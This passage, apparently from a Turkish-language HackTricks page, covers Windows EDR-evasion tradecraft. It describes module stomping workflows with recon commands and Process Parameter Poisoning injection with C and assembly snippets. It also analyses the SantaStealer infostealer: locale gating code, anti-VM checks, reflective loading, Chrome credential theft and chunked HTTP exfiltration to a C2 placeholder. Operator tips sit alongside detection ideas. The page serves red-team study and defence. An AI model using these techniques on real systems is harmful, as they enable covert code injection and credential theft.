`uxtheme.dll` veya `comctl32.dll` gibi common module'lere karşı yapılan naive stomping kırılgandır: DLL remote process'te yüklü olmayabilir ve code region'ın fazla küçük olması process'in çökmesine neden olur. Daha güvenilir workflow:

1. Target process module'lerini enumerate edin ve hâlihazırda yüklü DLL'lerden oluşan **names-only include list** tutun.
2. Önce payload'ı build edin ve **exact byte size** değerini kaydedin.
3. Candidate DLL'leri disk üzerinde scan edin ve PE section **`.text` `Misc_VirtualSize`** değerini payload size ile karşılaştırın. Bu, executable section'ın **memory'ye map edildiğindeki** boyutunu yansıttığı için file size'dan daha önemlidir.
4. **Export Address Table (EAT)**'i parse edin ve stomp start offset'i olarak export edilmiş bir function RVA seçin.
5. **Blast radius**'ı hesaplayın: payload seçilen function boundary'sini aşarsa, memory'de onun ardından yerleştirilmiş adjacent export'ları overwrite eder.

Gerçek dünyada görülen tipik recon/selection helper'ları:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operasyonel notlar
- `LoadLibrary`/beklenmeyen image loads telemetrisi oluşturmaktan kaçınmak için uzak process'te **zaten yüklenmiş** DLL'leri tercih edin.
- Hedef uygulama tarafından nadiren çalıştırılan export'ları tercih edin; aksi takdirde normal code path'ler thread oluşturulmadan önce veya sonra stomp edilmiş byte'lara ulaşabilir.
- Büyük implant'lar genellikle shellcode embedding işleminin bir string literal'dan **byte-array/braced initializer** biçimine değiştirilmesini gerektirir; böylece tam buffer injector source içinde doğru şekilde temsil edilir.

Tespit fikirleri
- Daha yaygın private RWX/RX allocation'lar yerine **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) üzerine yapılan remote write işlemleri.
- Bellekteki byte'ları diskteki backing file ile artık eşleşmeyen export entry point'leri.
- İlk byte'ları yakın zamanda değiştirilmiş meşru bir DLL export'u içinde çalışmaya başlayan remote thread'ler veya context pivot'ları.
- DLL `.text` sayfalarına yönelik, ardından thread creation gelen şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` dizileri.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3), klasik remote write path'ini (`VirtualAllocEx` + `WriteProcessMemory`) kullanmayan bir **process-injection / EDR-evasion** tekniğidir. Byte'ları zaten çalışan bir hedefe kopyalamak yerine, Windows'un **seçili `CreateProcessW` startup parameter'larını child process'e kopyalaması** ve bunları `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklaması gerçeğini kötüye kullanır.<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` tarafından kopyalanan Poisonable carrier'lar

Kullanışlı carrier'lar şunlardır:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Pratik carrier kısıtlamaları:

- `lpCommandLine`, `CreateProcessW` için **writable memory**'yi göstermelidir ve null terminator dahil **32.767 Unicode karakter** ile sınırlıdır.
- `lpEnvironment`, art arda gelen `NAME=VALUE\0` string'lerinden oluşan ve ekstra bir `\0` ile sonlandırılan bir Unicode environment block olmalıdır.
- `lpReserved` resmi olarak reserved olduğundan, `ShellInfo` mapping'i kararlı ve belgelenmiş bir contract yerine implementation detail olarak değerlendirilmelidir.

Bu, normal process creation'ı **payload-transfer primitive** haline getirir. Operator, child process'i attacker-controlled startup data ile oluşturur ve cross-process copy işlemini Windows'un gerçekleştirmesine izin verir.

### Remote write API'leri olmadan remote lookup flow

Child oluşturulduktan sonra, copied buffer'ı **read-only** primitive'ler ile resolve edin:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini alın
2. Remote `PEB`'i okuyun
3. `PEB.ProcessParameters`'ı takip edin
4. `RTL_USER_PROCESS_PARAMETERS`'ı okuyun
5. Seçilen pointer'ı kullanın:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Kopyalanan parametre buffer'ını yürütme

Kopyalanan parametre bölgesi genellikle `RW` durumundadır ve executable değildir. Yaygın bir P3 chain şöyledir:

1. Process'i normal şekilde oluşturun (suspended olmadan)
2. Seçilen parametre page'ini `NtProtectVirtualMemory` / `VirtualProtectEx` ile executable hâle getirin
3. `PROCESS_INFORMATION` içinde zaten döndürülen main thread handle'ını yeniden kullanın
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP`'i overwrite ederek) ile execution'ı redirect edin

Classic thread hijacking workflow'larının aksine bu işlem **`SuspendThread` / `ResumeThread` gerektirmez**; context, döndürülen main thread handle'ı üzerinden doğrudan değiştirilebilir.

Bu yöntem injection için genellikle monitor edilen çeşitli API'lerden kaçınır:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- çoğu zaman `SuspendThread` / `ResumeThread`

### Null-byte sınırlaması ve staged shellcode

Her üç carrier da **string veya string-like data** olduğundan, `0x00` içeren raw payload transfer sırasında truncate edilir. Pratik bir workaround, constant'ları runtime sırasında yeniden oluşturan ve ardından arbitrary bir second stage yükleyen **null-free first stage** kullanmaktır.

Basit bir pattern, XOR tabanlı constant synthesis'tir:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Bu, ilk aşamanın taşınan parametreye null byte eklemeden stack string'leri, API argümanlarını, DLL yollarını veya ikinci aşama shellcode loader'ını oluşturmasını sağlar.

### İlk aşamadan stack tabanlı API çağrıları

İlk aşamanın `LoadLibraryA` gibi API'leri çağırması gerektiğinde şunları yapabilir:

- string/buffer'ı hedef stack'e push etmek
- **32-byte x64 shadow space** ayırmak
- `RCX`, `RDX`, `R8`, `R9` register'larını sabitlere veya `RSP`-relative pointer'lara ayarlamak
- çağrıdan önce `RSP`'yi **16-byte aligned** tutmak

Ardından ikinci aşama stack'ten bir `PAGE_READWRITE` allocation'ına kopyalanabilir, `VirtualProtect` ile `PAGE_EXECUTE_READ` olarak değiştirilebilir ve doğrudan RWX allocation'ından kaçınmak için buraya jump edilebilir.

### Detection fikirleri

Yazarların belirttiği iyi hunting fırsatları:

- **process-parameter pages** üzerinde `VirtualProtectEx` / `NtProtectVirtualMemory` kullanılarak executable koruma ayarlanması
- bu koruma değişikliğinin ardından `SetThreadContext` / `NtSetContextThread` çağrılması
- `PEB` ve ardından `RTL_USER_PROCESS_PARAMETERS` üzerinde remote read işlemleri
- process creation sırasında olağandışı derecede uzun / yüksek entropy'li `lpCommandLine`, `lpEnvironment` veya `STARTUPINFO.lpReserved` değerleri

### Notlar

- P3, tek başına full execution primitive olmayan bir **cross-process transfer trick**'idir: kopyalanan parametrenin hâlâ execute-permission değişikliğine ve bir execution redirection method'una ihtiyacı vardır.
- `RtlCreateProcessReflection` / Dirty Vanity yazarlar tarafından değerlendirildi, ancak dahili olarak `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive'lere ulaştığı için reddedildi.

## Fileless Evasion ve Credential Theft için SantaStealer Tradecraft

SantaStealer (diğer adıyla BluelineStealer), modern info-stealer'ların AV bypass, anti-analysis ve credential access yöntemlerini tek bir workflow içinde nasıl birleştirdiğini gösterir.<sup>[[24]](#references)</sup>

### Keyboard layout gating ve sandbox delay

- Bir config flag'i (`anti_cis`), `GetKeyboardLayoutList` aracılığıyla kurulu keyboard layout'larını enumerate eder. Cyrillic layout bulunursa sample, boş bir `CIS` marker'ı bırakır ve stealer'ları çalıştırmadan terminate olur. Böylece hariç tutulan locale'lerde hiçbir zaman detonate olmazken hunting için bir artifact bırakır.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Katmanlı `check_antivm` mantığı

- Variant A, process listesini tarar, her adı özel bir rolling checksum ile hash'ler ve sonucu debugger/sandbox'lar için gömülü blocklist'lerle karşılaştırır; checksum'ı bilgisayar adı üzerinde de tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- Variant B, sistem özelliklerini inceler (process-count floor, recent uptime), VirtualBox additions'ı algılamak için `OpenServiceA("VBoxGuest")` çağrısı yapar ve single-stepping'i tespit etmek üzere sleep işlemleri çevresinde timing checks gerçekleştirir. Herhangi bir eşleşme, modüller başlatılmadan önce işlemi durdurur.

### Fileless helper + çift ChaCha20 reflective loading

- Birincil DLL/EXE, diske bırakılan veya bellekte manually mapped edilen bir Chromium credential helper içerir; fileless mode, helper artifact'larının yazılmaması için import'ları/relocation'ları kendisi çözer.
- Bu helper, ikinci aşama DLL'ini ChaCha20 ile iki kez şifrelenmiş olarak saklar (iki adet 32-byte key + 12-byte nonce). Her iki pass tamamlandıktan sonra blob'u reflectively load eder (`LoadLibrary` kullanılmaz) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)'dan türetilen `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export'larını çağırır.<sup>[[25]](#references)</sup>
- ChromElevator rutinleri, canlı bir Chromium browser'a inject etmek için direct-syscall reflective process hollowing kullanır, AppBound Encryption key'lerini devralır ve ABE hardening'e rağmen password'leri/cookie'leri/credit card'ları doğrudan SQLite database'lerinden decrypt eder.

### Modular in-memory collection ve chunked HTTP exfil

- `create_memory_based_log`, global `memory_generators` function-pointer table'ını iterate eder ve etkinleştirilmiş her modül için (Telegram, Discord, Steam, screenshot'lar, document'lar, browser extension'ları vb.) bir thread oluşturur. Her thread sonuçları shared buffer'lara yazar ve yaklaşık 45 saniyelik join window sonrasında file count'unu bildirir.
- İşlem tamamlandığında her şey, statically linked `miniz` library kullanılarak `%TEMP%\\Log.zip` olarak zip'lenir. Ardından `ThreadPayload1` 15 saniye sleep eder ve archive'ı HTTP POST aracılığıyla `http://<C2>:6767/upload` adresine 10 MB'lık chunk'lar halinde stream eder; browser `multipart/form-data` boundary'sini (`----WebKitFormBoundary***`) spoof'lar. Her chunk `User-Agent: upload`, `auth: <build_id>`, isteğe bağlı `w: <campaign_tag>` ekler; son chunk ise C2'nin reassembly işleminin tamamlandığını bilmesi için `complete: true` ekler.

## References

- [1] [Advanced Evasion Tradecraft: Hassas Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack'ler, malware için artık bedava geçiş yok](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokümanlar](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – örnek](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – örnek](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer için yeni infection chain ve ConfuserEx tabanlı obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – zero trust'ınıza güvenmeli misiniz? Zscaler posture checks'i bypass etmek](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell'den önce: Storm-2603'ün önceki ransomware operasyonlarını incelemek](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded Export'ları kötüye kullanmak](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports envanteri (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) desteğiyle EDR'lara karşı koymak](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect tekniğiyle Windows Defender'ın koruyucu kabuğunu kırmak](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain'ın altında: RAT'ten builder'a, builder'dan coder'a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer şehre geliyor: Yeni ve iddialı bir infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API Tracing ile Node.js malware'i alt etmek](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Adaptix'i Crystal Palace ile uyutmak](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET ve Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet Etw'nizi gizlemek](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team operasyonlarında Chrome Remote Desktop'ı kötüye kullanmak: Uygulamalı bir rehber](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender'ın remediation driver'ını kernel operation primitive olarak weaponize etmek](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM kullanarak self-masking function'lar oluşturmak](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
